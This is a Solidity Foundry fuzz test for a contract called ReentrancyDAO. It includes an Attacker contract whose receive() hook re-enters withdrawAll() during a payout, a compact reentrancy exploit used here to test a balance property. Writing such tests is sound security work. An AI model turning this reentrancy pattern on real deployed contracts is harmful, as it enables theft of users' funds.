// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import {Test} from "forge-std/Test.sol";
import {ReentrancyDAO} from "../src/ReentrancyDAO.sol";

contract InvMutTest is Test {
    ReentrancyDAO c;
    function setUp() public { c = new ReentrancyDAO(); }
    function testFuzz_property(uint256 amount) public {
        amount = bound(amount, 1, type(uint256).max / 2);
        Attacker a = new Attacker(c);
        vm.deal(address(a), amount);
        a.depositAndWithdraw(amount);
        assertTrue(address(c).balance == 0);
    }
}

contract Attacker {
    ReentrancyDAO c;
    bool reentered;
    constructor(ReentrancyDAO c_) { c = c_; }
    function depositAndWithdraw(uint256 amount) external {
        c.deposit{value: amount}();
        c.withdrawAll();
    }
    receive() external payable {
        if (!reentered) {
            reentered = true;
            c.withdrawAll();
        }
    }
}
